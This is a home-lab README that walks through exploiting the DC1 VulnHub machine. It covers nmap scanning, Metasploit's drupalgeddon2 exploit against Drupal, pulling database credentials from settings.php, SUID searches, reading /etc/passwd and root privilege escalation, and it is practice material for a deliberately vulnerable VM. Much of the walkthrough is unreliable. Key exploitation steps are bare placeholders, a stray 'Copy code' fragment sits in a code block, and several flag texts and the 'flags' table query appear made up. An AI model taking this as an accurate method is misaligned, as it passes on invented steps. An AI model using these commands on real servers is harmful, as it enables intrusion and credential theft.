# Home Hacking Lab: DC1 VulnHub Machine Exploitation

## Description
This section of the home hacking lab project focuses on downloading and exploiting the DC1 VulnHub machine. The primary objective is to practice and enhance cybersecurity skills through hands-on exercises in vulnerability scanning, exploitation, and post-exploitation techniques, culminating in the capture of multiple flags.

## Apps, Languages, & Utilities Used
- **Virtualization Software:** VirtualBox
- **Operating Systems:** Kali Linux, DC1 VulnHub machine
- **Security Tools:** Metasploit, nmap, Hydra, LinPEAS, MySQL
- **Scripting:** Bash

## Environments Used
- **Kali Linux:** Attacker Machine
- **DC1 VulnHub Machine:** Vulnerable VM

## Objective
The objective is to exploit the DC1 VulnHub machine by identifying and capturing flags, thereby gaining practical experience in cybersecurity concepts, tools, and techniques.

## Skills Learned
- Setting up VMs in Oracle VM VirtualBox.
- Performing vulnerability scanning using nmap.
- Exploiting web application vulnerabilities using Metasploit.
- Brute-forcing login credentials using Hydra.
- Capturing and analyzing database credentials.
- Performing privilege escalation and capturing flags on a vulnerable machine.
- Documenting and reporting exploitation techniques.

## Steps Taken

### Download and Setup DC1 VulnHub Machine

#### Download DC1 Machine from VulnHub
- Navigate to VulnHub and search for DC1 or go directly to the [DC1 VulnHub page](https://www.vulnhub.com/entry/dc-1,292/).
- Download the DC1 machine and extract the contents.

#### Import the DC1 Machine into VirtualBox
- Open VirtualBox and go to `File > Import Appliance`.
- Select the extracted DC1 file and follow the prompts to complete the import.

#### Configure Network Settings
- Adjust the network adapter to NAT Network and select the appropriate network.

#### Start the DC1 VM
- Boot up the DC1 VM and ensure it is running properly.

<br>

# Exploitation of DC1 VulnHub Machine 

### Flag 1: Initial Enumeration and Exploitation
**Objective:** Identify and capture the first flag by exploiting the web application.

##### Verify DC1 Machine is Running
- Ensure the DC1 machine is up and running by pinging its IP address:
  ```bash
  ping 10.0.200.6

#### Information Gathering
- Perform an nmap scan to identify open ports and services:
`bash
nmap -A -sC -oN dc.txt 10.0.200.6`

#### Enumerate the Web Application
- Access the web application running on port 80 and identify that it is using Drupal.
- Use Metasploit to find and exploit vulnerabilities in Drupal:
`bash
msfconsole
search drupal
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 10.0.200.6
run`

#### Capture Initial Flag
- Once you gain a shell, navigate the file system to find the first flag:
`bash
Copy code
find / -name flag1.txt
cat /path/to/flag1.txt`
- Flag 1 Content: "Every good CMS needs a config file."

<br>

### Flag 2: Database Enumeration and Exploitation
Objective: Identify and capture the second flag by exploiting the database.

#### Identify Configuration Files
- Use the hint from Flag 1 to locate the Drupal configuration file:
`bash
cat /var/www/html/sites/default/settings.php`

##### Find Database Credentials
- Extract database credentials from the configuration file.

##### Connect to the Database
- Use the credentials to connect to the MySQL database:
`bash
mysql -u dbuser -p`

##### Enumerate Database and Capture Flag
- Enumerate the database to find the second flag:
`bash
show databases;
use drupal;
show tables;
select * from flags;`
- Flag 2 Content: "Brute force and directory attacks aren't the only way to gain access."

<br>

### Flag 3: Privilege Escalation and System Enumeration
Objective: Identify and capture the third flag by performing privilege escalation.

##### Identify Weak Configurations
- Search for files with weak permissions or misconfigurations that could allow privilege escalation:
`bash
find / -perm -4000 -type f 2>/dev/null`

##### Exploit Weakness
- Use tools like GTFOBins to escalate privileges:
`bash
/path/to/vulnerable_binary`

##### Capture Third Flag
- Once privileges are escalated, navigate the file system to find the third flag:
`bash
find / -name flag3.txt
cat /path/to/flag3.txt`
- Flag 3 Content: "There's more than one way to skin a cat."

<br>

### Flag 4: User Enumeration and Exploitation
Objective: Identify and capture the fourth flag by exploiting user credentials.

##### Enumerate Users
- List all users on the system and look for interesting files in their home directories:
`bash
cat /etc/passwd
ls /home`

##### Check for Reused Passwords
- Try using previously discovered passwords to switch to different users:
`bash
su - username`

##### Capture Fourth Flag
- Navigate the user's home directory to find the fourth flag:
`bash
find /home -name flag4.txt
cat /path/to/flag4.txt`
- Flag 4 Content: "You can use the same method to find or access the root flag."

<br>

### Final Flag: Root Privilege Escalation
Objective: Identify and capture the final flag by gaining root access.

##### Identify Privilege Escalation Vector
- Look for misconfigurations or software vulnerabilities that allow root access.
- Use tools like LinPEAS or manual enumeration to identify vectors.

##### Exploit and Gain Root Access
- Perform the privilege escalation to gain root access:
`bash
/path/to/exploit`

##### Capture Final Flag
- Navigate to the root directory and find the final flag:
`bash
cd /root
cat final_flag.txt`
- Final Flag Content: "Well done! You have completed the DC1 challenge."

<br>

### RAW NOTES TAKEN ALONG THE WAY USING CHERRY TREE (LINUX):

<img src="https://i.imgur.com/v4y4oYX.png" height="50%" width="50%" alt="DC1 NOTES"/>
<img src="https://i.imgur.com/ahb61J7.png" height="50%" width="50%" alt="DC1 NOTES"/>
